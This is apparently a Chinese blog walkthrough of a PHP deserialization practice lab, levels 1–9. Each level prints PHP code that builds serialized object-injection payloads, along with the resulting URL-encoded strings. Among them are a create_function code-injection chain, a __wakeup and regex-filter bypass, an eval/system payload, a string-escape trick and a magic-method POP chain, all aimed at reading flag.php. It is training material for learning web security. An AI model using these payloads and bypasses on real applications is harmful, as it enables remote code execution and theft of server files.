<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TASK 2-php-SER-libs-main | Yian's Blog</title><meta name="author" content="一安"><meta name="copyright" content="一安"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="serialize() 函数用于序列化对象或数组，并返回一个字符串。serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。实例: 12345&lt;?php$sites &#x3D; array(&#x27;Google&#x27;, &#x27;Runoob&#x27;,">
<meta property="og:type" content="article">
<meta property="og:title" content="TASK 2-php-SER-libs-main">
<meta property="og:url" content="https://yian4243.github.io/2024/10/04/TASK-2-php-SER-libs-main/index.html">
<meta property="og:site_name" content="Yian&#39;s Blog">
<meta property="og:description" content="serialize() 函数用于序列化对象或数组，并返回一个字符串。serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。实例: 12345&lt;?php$sites &#x3D; array(&#x27;Google&#x27;, &#x27;Runoob&#x27;,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-10-04T06:29:00.000Z">
<meta property="article:modified_time" content="2024-10-05T08:45:00.117Z">
<meta property="article:author" content="一安">
<meta property="article:tag" content="关键词">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yian4243.github.io/2024/10/04/TASK-2-php-SER-libs-main/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TASK 2-php-SER-libs-main',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-05 16:45:00'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Yian's Blog"><span class="site-name">Yian's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TASK 2-php-SER-libs-main</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-04T06:29:00.000Z" title="发表于 2024-10-04 14:29:00">2024-10-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-05T08:45:00.117Z" title="更新于 2024-10-05 16:45:00">2024-10-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TASK 2-php-SER-libs-main"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>serialize() 函数用于序列化对象或数组，并返回一个字符串。<br>serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。<br>如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。<br>实例:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span> . PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出:<code>a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;</code><br>常见魔术方法的作用和触发条件：</p>
<table>
<thead>
<tr>
<th align="center">魔术方法</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__construct()</td>
<td align="center">创建对象时触发</td>
</tr>
<tr>
<td align="center">__destruct()</td>
<td align="center">对象被销毁时触发</td>
</tr>
<tr>
<td align="center">__sleep()</td>
<td align="center">在对象被序列化的过程中自动调用，且发生在序列化之前</td>
</tr>
<tr>
<td align="center">__wakeup()</td>
<td align="center">该魔术方法在反序列化的时候自动调用，且发生在反序列化之前</td>
</tr>
<tr>
<td align="center">__get()</td>
<td align="center">用于从不可访问或不存在的属性读取数据</td>
</tr>
<tr>
<td align="center">__set()</td>
<td align="center">用于将数据写入不可访问或不存在的属性</td>
</tr>
<tr>
<td align="center">__call()</td>
<td align="center">在对象上下文中调用不可访问的方法时触发</td>
</tr>
<tr>
<td align="center">__callStatic()</td>
<td align="center">在静态上下文中调用不可访问的方法时触发</td>
</tr>
<tr>
<td align="center">__toString()</td>
<td align="center">在对象当做字符串的时候会被调用</td>
</tr>
<tr>
<td align="center">__invoke()</td>
<td align="center">当尝试将对象调用为函数时触发</td>
</tr>
</tbody></table>
<h4 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h4><p>由于本关会获取flag值并将其进行反序列化后执行其action方法将其act值作为php语句执行，所以我们在url中为flag赋值，使其在反序列化后赋给act的值能够输出flag.php。<br>我们在在线工具中运行如下代码，获取能够输出flag.php的flag的url值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$act</span>=<span class="string">&quot;show_source(&#x27;flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>运行结果如下图：<br><img src="/image/level1-1.png" alt="level1-1"><br>然后在url后加上一段<code>?flag=O%3A1%3A&quot;a&quot;%3A1%3A%7Bs%3A3%3A&quot;act&quot;%3Bs%3A24%3A&quot;show_source%28%27flag.php%27%29%3B&quot;%3B%7D</code>即可<br><img src="/image/level1-2.png" alt="level1-2"></p>
<h4 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h4><p>本关通过<code>login</code>方法进行校验，对param进行反序列化后判断user和pass是否正确，因此，我们通过对账号密码实例进行序列化和url编码即可。<br>在线运行以下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;daydream&quot;</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>运行结果如下图，得到param值<code>O%3A7%3A%22mylogin%22%3A2%3A%7Bs%3A4%3A%22user%22%3Bs%3A8%3A%22daydream%22%3Bs%3A4%3A%22pass%22%3Bs%3A2%3A%22ok%22%3B%7D</code><br><img src="/image/level2-1.png" alt="level2-1"><br>在url后加上param值即可拿到flag：<br><img src="/image/level2-2.png" alt="level2-2"></p>
<h4 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h4><p>本关和上一关一样，只是在本关需要cookie传参，在浏览器中添加cookie名称为param，值为<code>O%3A7%3A%22mylogin%22%3A2%3A%7Bs%3A4%3A%22user%22%3Bs%3A8%3A%22daydream%22%3Bs%3A4%3A%22pass%22%3Bs%3A2%3A%22ok%22%3B%7D</code>即可。<br><img src="/image/level3.png" alt="level3"></p>
<h4 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h4><p>这关利用了一个特性: 当一个数组array中第一个参数是对象,第二个参数是该对象内的方法时,在反序列化该数组时会执行该对象内的该方法.<br><code>create_function()</code>:用于从字符串参数创建一个匿名函数.<br><code>create_function(string $args, string $code): string</code>:$args：字符串参数，用于定义匿名函数的参数。例如，‘a, b’ 将会创建一个接受两个参数 $a 和 b 的函数。<br>$code：字符串参数，包含匿名函数的主体。这通常是有效的 PHP 代码。<br>由于本关的param参数并未传递到某个函数，所以我们只能将函数传给param。通过观察代码中所给的两个类，不难发现，一个类可用于存储字符串，一个类可用于执行php代码,于是我们可以通过此段代码获取能够使本关显示flag的param值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;        </span><br><span class="line">               <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">       &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">           <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">       &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">func</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;code=<span class="string">&#x27;&#125;include(&quot;flag.php&quot;);echo $flag;//&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;action=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line"><span class="variable">$a2</span>-&gt;key=<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$b</span>,<span class="string">&quot;get_flag&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先array中第一个参数是设计好的GetFlag类的对象，第二个参数是它的方法，这样子充分利用了func类中的反序列化函数。<br>将array序列化后的值赋值给func的key属性值，这是为了之后反序列化能够实现。接着将func类的对象a2序列化再url转化。<br>后端函数在接收到序列化值时候，反序列化a2，函数执行结束调用析构函数，使得get_flag函数得以实现。<br>将取得的param值输入url中即可拿到flag。<br><img src="/image/level4.png" alt="level4"></p>
<h4 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h4><p>这关目标是要执行类<code>secret</code>的一个实例,这个实例的属性$file需要修改为 <code>$file=flag.php</code>, 但是这关有个魔术方法<code>__wakeup</code>会在反序列化时候修改<code>$file</code>,所以我们需要修改序列化结果,使其中属性数量大于实际数量就可以避免执行<code>__wakeup</code>方法。<br>先执行如下代码，序列化对象。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>得到<code>O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br>由于本关有一个过滤<code>preg_match(‘/[oc]:\d+:/i’,$cmd)</code>,使得字符<code>o</code>或<code>c</code>后跟冒号再跟数字的字符串不能通过。因此，我们在冒号后加一个<code>+</code>即可绕过，并将序列化后的字符串的类的数值改大。<br>再执行<code>echo urlencode(&#39;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#39;);</code>得到的值即可。<br><img src="/image/level5.png" alt="level5"></p>
<h4 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h4><p>这一关需要绕过的就是str_replace函数，因为private、public、protect在序列化时候有影响.<br>Public(公有):被序列化时属性值为：属性名<br>Protected(受保护):被序列化时属性值为：\x00*\x00属性名<br>Private(私有):被序列化时属性值为：\x00类名\x00属性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$comm</span>=<span class="string">&quot;system(&#x27;sort flag.php&#x27;);&quot;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>此代码产生的序列化能够使本关按行排序输出flag.php内容，但private初始化的变量被序列化时会产生<code>%00</code>,用<code>\00</code>替代并将相关的s换成大写即可。<br><img src="/image/level6.png" alt="level6"></p>
<h4 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h4><p>这里多了一个call方法，这个方法就是如果调用对象中没有的方法就会调用call方法。查看源代码，只要调用一个my类对象没有的方法，并且func和name的值对的上就行。call触发后会把该不存在的方法名直接以参数的形式传入__call方法中。<br>至于如何调用到my中的方法，就要利用you类中的destruct方法。分析过后，将方法名赋值给pro就行，然后将body指向my的对象，这样$this-&gt;body-&gt;$project();就可以调用my的方法了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setbody</span>(<span class="params"><span class="variable">$body</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body=<span class="variable">$body</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">you</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setbody</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/image/level7.png" alt="level7"></p>
<h4 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h4><p>即使我们修改了pass的值在反序列化后执行代码中还是会对pass初始化，这里实践是在考察增量逃逸，增量逃逸其实是利用了序列化与反序列化的属性个数检查差异实现。如果我们在<code>user</code>中加入一个<code>&#125;</code>就可以在反序列化时提前闭合，且该方法不会在序列化时闭合。本关中的filter函数会将param中包含的<code>flag</code>和<code>php</code>替换成<code>hack</code>，且将<code>php</code>换成<code>hack</code>时会在序列化格式中产生一个长度差，所以我们在<code>user</code>中每写入一个<code>php</code>就会弥补一个长度差。因为我们需要在user后加入<code>&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</code>共29个字符，所以我们需要在user中写入29个php，即<code> $a=new test(&#39;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#39;);</code>。<br>最终payload为<code>O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</code>。<br>本关也可以通过手动修改s的大小防止报错，如<code>O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:1:&quot;1&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125; </code><br><img src="/image/level8.png" alt="level8"></p>
<h4 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h4><p>本关出现了多个魔术方法：<br>__invoke()    当一个类被当作函数执行时调用此方法。<br>__construct   在创建对象时调用此方法<br>__toString()  在一个类被当作字符串处理时调用此方法<br>__wakeup()    当反序列化恢复成对象时调用此方法<br>__get()       当读取不可访问或不存在的属性的值会被调用<br>因此，我们先将Modifier中的<code>var</code>值初始化改为<code>flag.php</code>然后添加下面这段语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="variable">$b</span>;  <span class="comment">//把show类当成字符串赋值给属性source从而触发to_string</span></span><br><span class="line"><span class="variable">$b</span>-&gt;source-&gt;str=<span class="variable">$c</span>; <span class="comment">//b类中的source类中的str赋值为Test类,当调用该类中不存在的属性source时触发get</span></span><br><span class="line"><span class="variable">$c</span>-&gt;p=<span class="variable">$a</span>;<span class="comment">//p是Modifier类，当这个类被当成函数调用的时候就会触发该类内的invoke</span></span><br></pre></td></tr></table></figure>
<p>得到的payload为<code>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</code><br>上传后即可<br><img src="/image/level9.png" alt="level9"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yian4243.github.io">一安</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yian4243.github.io/2024/10/04/TASK-2-php-SER-libs-main/">https://yian4243.github.io/2024/10/04/TASK-2-php-SER-libs-main/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yian4243.github.io" target="_blank">Yian's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/10/TASK-3-vulhub/" title="TASK 3 vulhub"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TASK 3 vulhub</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/24/TASK-1-SQL/" title="TASK 1-SQL"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TASK 1-SQL</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">一安</div><div class="author-info__description">描述</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li 